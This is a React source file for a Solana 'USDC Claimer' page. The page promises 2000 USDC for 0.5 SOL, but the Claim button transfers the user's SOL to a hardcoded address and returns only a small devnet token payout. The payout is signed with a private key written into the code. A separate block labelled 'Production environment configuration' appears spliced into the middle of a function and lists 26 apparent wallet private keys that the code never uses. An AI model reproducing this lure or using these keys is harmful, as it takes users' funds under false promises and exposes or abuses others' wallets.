/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "3UnXaHoaN3LUB3xfxTMhE2TnsHhZW7AekUPSgFeSdQALD9LBX8DLy1VW5m3RqZfhDRBJvLnNSSTcDSmBpTCd3ARj"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5kF64za7uXKyz2opKrYhdfzCjA265MvtbBCYU27xBfRQrpvruSohrHpySy4PqGMndX9hpaRMyukreRndy1PwNaBF",
  "key1": "3wZnapPwNGfaMDy2RaHH4qjn8AhRYXa6hKdCxSpNEkB1VhJnrF5cimjSGEZ6nU1QXkNMiUUVG3BowAXgzuwewuxH",
  "key2": "4j4NmYjXE4Sh28CYmcKEt6iTYi14fU5u4TmSfq44gvz2D9JH9uynnxpcKapPWbQXS2h3wNMtnvMyc1t7vA7Tn9H4",
  "key3": "38DEQ2r4ircNdghdRV8bJLB2ohF4h6CCBC38amANky7smtrnLRqi1mvqwvDysTviv9XSpqdsAX8GG7wjTxNkrJ6G",
  "key4": "5Wuw8eRBDuFJtzDwbWL2gk5u2hQqcc6J4ti8arrPt5DbFY1u8yLPRQEM46FVF6jwnLjhJ1EttTXQRdDPxmZiUPgr",
  "key5": "336GSkaWYprnW5BNQBCX1yZNFqru56bFGxt8w7WnBvrUvax3VVvZJ9HmXWArAUFhZ9ttCbgEBQwjzAzqJBJTZ7P",
  "key6": "dawrzFSVpP994XVxXZiFQjEQYRZ2xGzrguzKv46nHiMzSjMgybVt1mH6oDteq559BcjTWRUa11guVPGwXkZaYZL",
  "key7": "3SoVbjsaCvoK3kWJygQWGikEECq1h2ZBrkE5xNTE7rWBbg25hmjJKkRTApFzZ9ti3yVbsofa5R5PeK9tQ48mH9eC",
  "key8": "4r2umXmexYnJiKPK3nJMJmhEtq18LSvmU1dNvuYH125AbCbiSej4dBY2uKSpc26bm6tdWxjwN32PTwN7qTB3PjEb",
  "key9": "4hywotUW6q6RsZ1Sq3BbgiYq1kFEyyMULgaSUp8atMgKTsKNMaL1SPh1pyhsRXNzmx8D9wyB4PdavA9SgWoziTgz",
  "key10": "vmhDcpL8djYALW9E4Tev6TgbeQ7oHkNZyY4XsmEVLKothfmeNFcKTf9V79kRKC45xYKMwWkUHE66HVYNHYuDX8u",
  "key11": "2q5Nqgj5DZSSfLKAXvSpMSCgs1WNGJ65VtofmLahEpQZCgbUbLtJMEBhHwtHjiRQ3ZWdLVAc66jKuj4Wgm8GD45r",
  "key12": "2Fu1841PQTQy5XasaBpbR5SPCKZvtPSntsVdXjJMBFx7RDTwW2UiYiqdBbN8PZBFzKrQdyNm47L5CT6wH6mBqaxJ",
  "key13": "Kn7igwZJrWiajykfTEayP85dKQNZn2eGAUgZPpQzdTbNKJQXyEdtvYF7D5EVyKQUiBFeh6Fco8ZT1VnYwNeD9Je",
  "key14": "4sVXRz5b7UGY4UnjGbJ2me2udbhpiGk2n88jbhdVB7gzFQUTJBKQGrLbzoyqjt3RyBX9fsuhJ3nSr8KS17fNiYZD",
  "key15": "5HjqYVjHWaVRdmuWH7fvEqUfdBaUW2sAGPJV2sLvAq3JudTW7WedVXLqMxTDqxVTqTLJFT9JDKv1QoXQDEWkt9Z2",
  "key16": "4Uy6qXHJJnQ3xojJmghSLbrxydftdSA1GvGB2EXRYWZr4tWkcMeDdRU32Q6y8mj4iUZ1XKacUij2jtHjRNkfQAZE",
  "key17": "5rRouo6oPYtsVkkWGYkMREkyFWYExbB7t6UH6SHWYqXxYVgvzs7PDDogV5s9bh9tqQRqicnpDkRvG3TjcGWbkEGU",
  "key18": "23CHour1N1sLT943MVxQk7gzauax3V6GEdSbn59wh2mgDT72VsqgQ9APfqW9JrZtnS94mJuur2koDDtCVn7xEUxb",
  "key19": "hEHUDMgcXVTdzwR58njmvPcg3wJx6cRn6THAcp1RDyDpsenDrF6ihRwDwFMQ3XUprsfgFkaHCmZGjfmw6QMHUXY",
  "key20": "ypfwt1FozeJ32WtujyFYLfrZKGKoa39xM7JYPxa24Kd8pV4teUMhBqbRZLSZFBLCbf7kB3b3niFdgTz7mhpKvyd",
  "key21": "3mcx8oGYDaafGnHt8n55xU1uqGkcXR1ehwuVzugUfFRNfCBEsqwH9mpmVxz4rGvZ8fuwjq2qASRtMR5EuJki77Ux",
  "key22": "KUBNMBCPsQmbsDa5mZmhvAtTR3mzxbtGCDS22HWqiLewv2JkKChiSScJXGKiaW1FPFdXtkhWnQsDwQGhiZg9rpd",
  "key23": "2SJmbSV1r3CeHcfxzQE5gnVZrrsEAqFFhixs2L9q2E1UAu4MdAj4q7jT98RwEoyRUKbUJeL38NikZ7qFn4tZD8ve",
  "key24": "2A2iXWGHtJh5jCAHY3iLWuGrSbWxHN2jFTnNjbfdXhUwUiwi3BAqZC1NomMmoPbsMwh8WphDF6JrD7JfYQuzV8WZ",
  "key25": "4oUJ5atdA5ttDpqf1vc9K2hFhQbuwAQmdQZvMga43duLxk3knVhpyK8ExB9XzvHt3HqQmmB41QxN4FZxgG1dTbgM"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
